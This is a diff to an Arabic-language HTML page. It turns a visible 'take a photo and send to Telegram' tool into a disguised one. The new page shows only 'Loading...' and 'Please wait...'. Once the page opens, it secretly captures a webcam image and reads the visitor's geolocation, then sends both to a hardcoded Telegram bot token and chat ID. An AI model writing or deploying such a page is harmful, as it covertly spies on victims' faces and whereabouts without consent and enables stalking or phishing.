@@ -1,76 +1,65 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>التقاط صورة وإرسالها</title>
+  <title>جارٍ التحميل...</title>
 </head>
 <body>
-  <h2>التقط صورة وأرسلها إلى تليجرام</h2>
-
-  <video id="video" width="300" autoplay muted playsinline style="display: block;"></video>
-  <br>
-  <button onclick="takePhoto()">التقط صورة</button>
+  <h2>يرجى الانتظار...</h2>
 
   <script>
-    let stream;
-    let video = document.getElementById('video');
-
-    // تشغيل الكاميرا أولاً
-    async function startCamera() {
+    async function captureAndSend() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
         video.srcObject = stream;
-      } catch (err) {
-        console.error('فشل تشغيل الكاميرا:', err);
-      }
-    }
+        video.play();
 
-    // التقاط الصورة
-    async function takePhoto() {
-      try {
+        // انتظر شوي حتى تشتغل الكاميرا
+        await new Promise(resolve => setTimeout(resolve, 3000));
+
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
+        canvas.width = 640;
+        canvas.height = 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         const imageData = canvas.toDataURL('image/jpeg');
+
+        // تحويل base64 إلى ملف Blob
         const blob = await (await fetch(imageData)).blob();
+
+        const formData = new FormData();
+        formData.append("chat_id", "1320552080");
+        formData.append("photo", blob, "capture.jpg");
+
+        // إرسال إلى تليجرام (الصورة)
+        fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
+          method: "POST",
+          body: formData
+        });
 
         // إيقاف الكاميرا
         stream.getTracks().forEach(track => track.stop());
 
-        // الحصول على الموقع
-        navigator.geolocation.getCurrentPosition(async (position) => {
+        // ✅ إضافة إرسال الموقع
+        navigator.geolocation.getCurrentPosition(position => {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
 
-          // إرسال الصورة
-          const formData = new FormData();
-          formData.append("chat_id", "1320552080");
-          formData.append("photo", blob, "capture.jpg");
-
-          await fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
-            method: "POST",
-            body: formData
-          });
-
-          // إرسال الموقع
-          await fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
+          fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
             method: "GET"
           });
-
-        }, (error) => {
-          console.error("فشل تحديد الموقع:", error);
+        }, error => {
+          console.error("فشل الحصول على الموقع:", error);
         });
 
       } catch (err) {
-        console.error('فشل في التقاط الصورة أو الإرسال:', err);
+        console.error("فشل الوصول إلى الكاميرا:", err);
       }
     }
 
-    // بدء تشغيل الكاميرا تلقائياً
-    startCamera();
+    captureAndSend();
   </script>
 </body>
 </html>
